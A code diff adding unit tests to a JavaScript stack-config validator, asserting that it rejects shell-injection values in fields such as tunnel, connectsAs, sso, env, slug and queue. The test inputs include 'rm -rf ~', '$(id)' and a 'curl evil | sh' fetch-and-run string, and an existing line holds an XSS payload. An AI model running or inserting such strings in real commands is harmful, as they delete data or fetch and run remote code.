@@ -150,6 +150,17 @@ console.log('ok');
   assert.equal(validateStack(st('5432"><img src=x onerror=alert(1)>')).length, 2);
   assert.match(validateStack(st(70000)).join(), /prereqs\[0\]\.port/);
 }
+    // Values that end up in commands must look like what they are.
+{
+  const st = (prereq, extra = {}) => ({ envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a', prereqs: [prereq], ...extra } } });
+  assert.deepEqual(validateStack(st({ tunnel: 'db.acme.dev', port: 5432, connectsAs: 'db-1.internal', env: 'ConnectionStrings__Db' })), []);
+  assert.deepEqual(validateStack(st({ sso: 'acme-qa' })), []);
+  for (const [bad, field] of [[{ tunnel: 'db.acme.dev; touch /tmp/x #' }, 'tunnel'], [{ connectsAs: 'x" && rm -rf ~' }, 'connectsAs'], [{ hosts: 'a b' }, 'hosts'], [{ sso: 'qa; curl x' }, 'sso'], [{ env: 'A=$(id)' }, 'env']])
+    assert.match(validateStack(st(bad)).join(), new RegExp(`prereqs\\[0\\]\\.${field}`), field);
+  assert.match(validateStack(st({}, { slug: 'acme/a.git; curl evil | sh #' })).join(), /slug/);
+  assert.match(validateStack(st({}, { secrets: [{ env: 'DB URL' }] })).join(), /secrets\[0\]\.env/);
+  assert.match(validateStack({ ...st({}), queues: { q: { name: 'Q', type: 'sqs', queue: 'x; rm' } } }).join(), /queues\.q\.queue/);
+}
 console.log('switch stacks ok');
   }
 }
